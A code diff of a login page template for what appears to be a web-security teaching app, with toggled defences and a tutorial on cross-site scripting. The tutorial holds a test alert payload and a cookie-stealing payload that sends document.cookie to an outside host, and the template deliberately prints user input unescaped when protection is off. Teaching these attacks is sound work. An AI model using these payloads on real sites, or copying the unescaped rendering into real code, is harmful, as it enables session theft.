@@ -70,17 +70,17 @@ html
       p Please Log In:
       p: #[input(type="text" id="username")] #[input(type="text" id="password")] #[input(type="submit" onclick="tryLogin();")]
       
-      if user != null && user != 'null' && user != ''
+      if setUser != null && setUser != 'null' && setUser != ''
         if ACCEPT
-          if p.charAt(1) != '2' && user
-            p SUCCESSFULLY LOGGED IN AS !{user}.
+          if p.charAt(1) != '2' && setUser
+            p SUCCESSFULLY LOGGED IN AS !{setUser}.
           else 
-            p SUCCESSFULLY LOGGED IN AS #{user}.
+            p SUCCESSFULLY LOGGED IN AS #{setUser}.
         else
-          if p.charAt(1) != '2' && user
-            p ATTEMPTED TO LOG IN AS !{user}. FAILED
+          if p.charAt(1) != '2' && setUser
+            p ATTEMPTED TO LOG IN AS !{setUser}. FAILED
           else 
-            p ATTEMPTED TO LOG IN AS #{user}. FAILED
+            p ATTEMPTED TO LOG IN AS #{setUser}. FAILED
 
     <input type="hidden" value="Default Text" id="textToCopy">
     script.
@@ -92,11 +92,15 @@ html
         EncryptLv = parseInt(#{p.charAt(0)});
         InSafeLv = parseInt(#{p.charAt(1)});
         UrlSafeLv = parseInt(#{p.charAt(2)});
-        uCookie = !{JSON.stringify(user)};
+        uCookie = !{JSON.stringify(setUser).replace(/<\//g, '<\\\/')};
+        ACCEPT = #{ACCEPT};
         if (window.location.href.includes('/out')) {
           uCookie = '';
           refreshProtections();
           window.location.href = '/login'+getQueries();
+        }
+        if (!ACCEPT) {
+          uCookie = ''
         }
         refreshProtections();
         document.getElementById("prev-button-atk").style.display = 'none';
@@ -291,13 +295,13 @@ html
             } else if (page == 1) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
-              document.getElementById("textToCopy").value = decodeURIComponent(" %3Cscript%3E alert(`helloworld`) %3C/script%3E ");
-              content.innerHTML = "-->Cross-Site Scripting (XSS) 1<br><br>First we need to know if a website is XSS exploitable. This technique can only work on websites that do not employ some basic defences, such as <u>Input Encoding</u> which you can read more about in its respective Defence section. To verify this, try entering the following text to either page with Encoding on and off. <br><br> &lt;script&gt; alert(`helloworld`) &lt;/script&gt; <button onclick='copyElementToClipboard()'>Copy text</button> <br><br>How this works is that our input is assigned to a variable as normal, which the website attempts to reprint back to us. However, as our text uses the script tags, in trying to print it instead runs the inputted code. In this case, a pop-up is shown. <br><br>Now we know, with Encoding off, we can inject code that the website is forced to run.";
+              document.getElementById("textToCopy").value = decodeURIComponent('%3Cscript%3Ealert("helloworld")%3C/script%3E');
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 1<br><br>First we need to know if a website is XSS exploitable. This technique can only work on websites that do not employ some basic defences, such as <u>Input Encoding</u> which you can read more about in its respective Defence section. To verify this, try entering the following text to either page with Encoding on and off. <br><br> &lt;script&gt;alert("helloworld")&lt;/script&gt; <button onclick="copyElementToClipboard()">Copy text</button> <br><br>How this works is that our input is assigned to a variable as normal, which the website attempts to reprint back to us. However, as our text uses the script tags, in trying to print it instead runs the inputted code. In this case, a pop-up is shown. <br><br>Now we know, with Encoding off, we can inject code that the website is forced to run.';
             } else if (page == 2) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'block';
-              document.getElementById("textToCopy").value = decodeURIComponent(" %3Cscript%3E window.location= `https://google.com?`+document.cookie %3C/script%3E ");
-              content.innerHTML = "-->Cross-Site Scripting (XSS) 2<br><br>The alert we just ran is not damaging, but let’s see the kind of harm that an attacker could do by making the command more malicious. With Cross-Site Scripting, an attacker can steal users’ cookies.<br><br>Cookies are stored on a user-by-user basis and can indicate some very important information. One particularly important item is a user’s session-cookie, which gives them their access rights to the website. If these get stolen, the thief can access the user’s session to make changes with their privilege. <br><br>A simple way to reveal stored cookies is by linking users and sending their cookies with them, for example try the following input while noting what it says in the url:<br><br>&lt;script&gt; window.location= `https://google.com?`+document.cookie &lt;/script&gt; <button onclick='copyElementToClipboard()'>Copy text</button>";
+              document.getElementById("textToCopy").value = decodeURIComponent('%3Cscript%3Ewindow.location="https://google.com?"+document.cookie%3C/script%3E');
+              content.innerHTML = '-->Cross-Site Scripting (XSS) 2<br><br>The alert we just ran is not damaging, but let’s see the kind of harm that an attacker could do by making the command more malicious. With Cross-Site Scripting, an attacker can steal users’ cookies.<br><br>Cookies are stored on a user-by-user basis and can indicate some very important information. One particularly important item is a user’s session-cookie, which gives them their access rights to the website. If these get stolen, the thief can access the user’s session to make changes with their privilege. <br><br>A simple way to reveal stored cookies is by linking users and sending their cookies with them, for example try the following input while noting what it says in the url:<br><br>&lt;script&gt; window.location= "https://google.com?"+document.cookie &lt;/script&gt; <button onclick="copyElementToClipboard()">Copy text</button>';
             }  else if (page == 3) {
               document.getElementById("prev-button-atk").style.display = 'block';
               document.getElementById("next-button-atk").style.display = 'none';
